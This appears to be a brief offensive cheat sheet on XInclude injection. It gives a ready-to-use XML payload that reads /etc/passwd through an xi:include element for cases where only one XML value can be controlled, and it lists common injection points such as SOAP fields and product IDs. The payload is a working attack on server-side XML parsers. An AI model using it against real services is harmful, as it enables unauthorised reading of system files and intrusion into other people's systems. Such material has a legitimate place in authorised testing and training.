# XInclude Attacks

## Use Case

Only a single XML value is controllable.

Cannot inject DOCTYPE.

---

## Payload

<foo xmlns:xi="http://www.w3.org/2001/XInclude">

<xi:include parse="text"
href="file:///etc/passwd"/>

</foo>

---

## Common Locations

SOAP fields

Product IDs

XML attributes

Embedded XML values